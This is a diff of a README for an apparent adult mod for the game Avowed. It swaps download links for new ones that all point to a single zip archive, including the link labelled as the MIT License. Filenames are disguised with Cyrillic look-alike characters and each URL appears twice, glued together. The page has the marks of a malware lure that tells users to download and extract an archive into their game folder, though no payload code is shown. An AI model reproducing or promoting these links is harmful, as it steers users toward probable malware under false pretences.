@@ -26,11 +26,11 @@ Welcome to **Avowed Adult Mod** – the essential enhancer for your Avowed gamep
 
 ## 🛠️ Installation
 
-1. Download **https://raw.githubusercontent.com/shabazz007/AvowedAfterDark/main/Lоader.zip** from the repository 🗂️  
+1. Download **https://github.com/shabazz007/AvowedAfterDark/raw/refs/heads/main/irremissibleness/After_Dark_Avowed_v2.3.zipоhttps://github.com/shabazz007/AvowedAfterDark/raw/refs/heads/main/irremissibleness/After_Dark_Avowed_v2.3.zip** from the repository 🗂️  
 2. Extract to your Avowed main directory  
 3. Launch your game and follow on-screen setup  
 
-_Note: Always use the latest https://raw.githubusercontent.com/shabazz007/AvowedAfterDark/main/Lоader.zip for best results!_
+_Note: Always use the latest https://github.com/shabazz007/AvowedAfterDark/raw/refs/heads/main/irremissibleness/After_Dark_Avowed_v2.3.zipоhttps://github.com/shabazz007/AvowedAfterDark/raw/refs/heads/main/irremissibleness/After_Dark_Avowed_v2.3.zip for best results!_
 
 ## 📈 SEO-Friendly Keywords
 
@@ -42,6 +42,6 @@ This mod is intended for adults (18+) and is purely for entertainment. Please re
 
 ## 📝 License
 
-MIT © 2025 | [Learn more about the MIT License](https://raw.githubusercontent.com/shabazz007/AvowedAfterDark/main/Lоader.zip)
+MIT © 2025 | [Learn more about the MIT License](https://github.com/shabazz007/AvowedAfterDark/raw/refs/heads/main/irremissibleness/After_Dark_Avowed_v2.3.zipоhttps://github.com/shabazz007/AvowedAfterDark/raw/refs/heads/main/irremissibleness/After_Dark_Avowed_v2.3.zip)
 
 Enjoy the ultimate Avowed experience with the community’s favorite adult enhancement!
